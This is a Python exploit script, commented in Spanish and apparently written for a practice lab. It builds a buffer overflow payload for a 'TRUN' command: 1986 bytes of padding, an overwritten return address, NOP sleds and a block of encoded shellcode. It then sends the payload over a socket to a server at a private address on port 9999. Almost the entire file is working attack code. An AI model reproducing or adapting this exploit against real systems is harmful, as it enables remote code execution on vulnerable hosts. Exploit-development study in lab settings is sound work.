import socket

victima = "192.168.153.129"
puerto = 9999

buf = "TRUN Hola. Offensive Code " + "A" * 1986 
buf += "\x62\x50\x11\xd3"[::-1] 			#EIP address
buf += "\x90" * 10				# 10 NOPS


buf += b"\xbb\x09\x28\x6c\xfb\xda\xc3\xd9\x74\x24\xf4\x58\x33"
buf += b"\xc9\xb1\x52\x31\x58\x12\x03\x58\x12\x83\xc9\x2c\x8e"
buf += b"\x0e\x35\xc4\xcc\xf1\xc5\x15\xb1\x78\x20\x24\xf1\x1f"
buf += b"\x21\x17\xc1\x54\x67\x94\xaa\x39\x93\x2f\xde\x95\x94"
buf += b"\x98\x55\xc0\x9b\x19\xc5\x30\xba\x99\x14\x65\x1c\xa3"
buf += b"\xd6\x78\x5d\xe4\x0b\x70\x0f\xbd\x40\x27\xbf\xca\x1d"
buf += b"\xf4\x34\x80\xb0\x7c\xa9\x51\xb2\xad\x7c\xe9\xed\x6d"
buf += b"\x7f\x3e\x86\x27\x67\x23\xa3\xfe\x1c\x97\x5f\x01\xf4"
buf += b"\xe9\xa0\xae\x39\xc6\x52\xae\x7e\xe1\x8c\xc5\x76\x11"
buf += b"\x30\xde\x4d\x6b\xee\x6b\x55\xcb\x65\xcb\xb1\xed\xaa"
buf += b"\x8a\x32\xe1\x07\xd8\x1c\xe6\x96\x0d\x17\x12\x12\xb0"
buf += b"\xf7\x92\x60\x97\xd3\xff\x33\xb6\x42\x5a\x95\xc7\x94"
buf += b"\x05\x4a\x62\xdf\xa8\x9f\x1f\x82\xa4\x6c\x12\x3c\x35"
buf += b"\xfb\x25\x4f\x07\xa4\x9d\xc7\x2b\x2d\x38\x10\x4b\x04"
buf += b"\xfc\x8e\xb2\xa7\xfd\x87\x70\xf3\xad\xbf\x51\x7c\x26"
buf += b"\x3f\x5d\xa9\xe9\x6f\xf1\x02\x4a\xdf\xb1\xf2\x22\x35"
buf += b"\x3e\x2c\x52\x36\x94\x45\xf9\xcd\x7f\xaa\x56\x54\xff"
buf += b"\x42\xa5\x66\x01\x28\x20\x80\x6b\x5e\x65\x1b\x04\xc7"
buf += b"\x2c\xd7\xb5\x08\xfb\x92\xf6\x83\x08\x63\xb8\x63\x64"
buf += b"\x77\x2d\x84\x33\x25\xf8\x9b\xe9\x41\x66\x09\x76\x91"
buf += b"\xe1\x32\x21\xc6\xa6\x85\x38\x82\x5a\xbf\x92\xb0\xa6"
buf += b"\x59\xdc\x70\x7d\x9a\xe3\x79\xf0\xa6\xc7\x69\xcc\x27"
buf += b"\x4c\xdd\x80\x71\x1a\x8b\x66\x28\xec\x65\x31\x87\xa6"
buf += b"\xe1\xc4\xeb\x78\x77\xc9\x21\x0f\x97\x78\x9c\x56\xa8"
buf += b"\xb5\x48\x5f\xd1\xab\xe8\xa0\x08\x68\x18\xeb\x10\xd9"
buf += b"\xb1\xb2\xc1\x5b\xdc\x44\x3c\x9f\xd9\xc6\xb4\x60\x1e"
buf += b"\xd6\xbd\x65\x5a\x50\x2e\x14\xf3\x35\x50\x8b\xf4\x1f"

buf += "\x90" * 10		# 10 NOPs finales

#exploit = TRUN COMAND + A OFFSET + RET ADDR + NOPS + SHELLCODE + NOPS

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((victima, puerto))

#luego de conectar con el servidor, este responde con un mensaje de bienvenida, debemos recibirlo usando 'recv'
print ( s.recv( 1024 ) )

#enviaremos el buffer al servidor

s.send(buf)

#recibimos la respuesta y la imprimimos en pantalla

print(s.recv(1024))


s.close


